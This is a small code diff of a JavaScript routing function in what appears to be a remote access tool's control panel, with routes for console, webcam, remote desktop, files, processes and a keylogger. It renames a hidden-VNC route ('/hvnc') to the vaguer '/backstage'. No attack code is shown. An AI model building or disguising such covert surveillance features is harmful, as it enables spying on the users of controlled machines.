@@ -77,7 +77,7 @@ function resolveOpenUrl(clientId, target) {
     case "console":     return `/${clientId}/console`;
     case "remotedesktop": return `/viewer?clientId=${clientId}&mode=desktop`;
     case "webcam":      return `/viewer?clientId=${clientId}&mode=webcam`;
-    case "Backstage":   return `/hvnc?clientId=${clientId}`;
+    case "Backstage":   return `/backstage?clientId=${clientId}`;
     case "files":       return `/${clientId}/files`;
     case "processes":   return `/${clientId}/processes`;
     case "keylogger":   return `/${clientId}/keylogger`;
